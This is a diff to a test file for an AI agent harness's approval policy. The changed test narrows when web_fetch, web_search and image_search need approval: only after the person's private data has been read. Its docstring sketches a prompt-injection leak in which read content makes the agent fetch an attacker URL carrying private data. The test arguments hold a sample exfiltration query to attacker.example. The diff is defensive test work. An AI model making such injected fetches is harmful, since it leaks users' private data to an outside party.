@@ -129,15 +129,15 @@ def test_HOLDS_concurrent_apply_all_on_the_same_cards_writes_once(studio):
     assert titles.count("A one") == 1 and titles.count("B two") == 1, titles
 
 
-def test_HOLDS_web_tools_are_tier_3_only_after_content_entered_the_turn(studio):
-    """The owner's rule (2026-10-21, #89): web_fetch, web_search and
-    image_search send an agent-chosen URL or query off the machine, so once
-    untrusted content has entered the turn (a page, an email, an automation's
-    turn) they are Tier 3: content the agent read can make it fetch
-    https://attacker/?d=<private data>, and the fetch is the leak. From the
-    person's own clean turn they are Tier 1: a lookup they asked for creates,
-    modifies and notifies nothing, and a card on every lookup trains approving
-    without reading."""
+def test_HOLDS_web_tools_are_tier_3_only_after_a_private_read(studio):
+    """The owner's rule (2026-10-21, #89; narrowed 2026-10-24): web_fetch,
+    web_search and image_search send an agent-chosen URL or query off the
+    machine, so once the person's PRIVATE data has been read in the turn (an
+    email, a file, the ledger, an automation's turn) they are Tier 3: content
+    the agent read can make it fetch https://attacker/?d=<private data>, and
+    the fetch is the leak. With nothing private read they are Tier 1, even
+    after untrusted web content: there is nothing of the person's to leak, and
+    a card on every lookup trains approving without reading."""
     from app.policy.classify import classify
     from app.policy.models import Tier
     from omniharness.agents.middlewares.policy_hook import build_policy_middleware
@@ -150,5 +150,7 @@ def test_HOLDS_web_tools_are_tier_3_only_after_content_entered_the_turn(studio):
         "image_search": {"query": f"site:attacker.example {SECRET_PATH}"},
     }
     for name, args in cases.items():
-        assert classify(name, args, rules, after_content=True).tier is Tier.TIER_3, name
+        assert classify(name, args, rules, after_content=True, private_read=True).tier is Tier.TIER_3, name
+        assert classify(name, args, rules, after_content=False, private_read=True).tier is Tier.TIER_3, name
+        assert classify(name, args, rules, after_content=True, private_read=False).tier is Tier.TIER_1, name
         assert classify(name, args, rules, after_content=False).tier is Tier.TIER_1, name
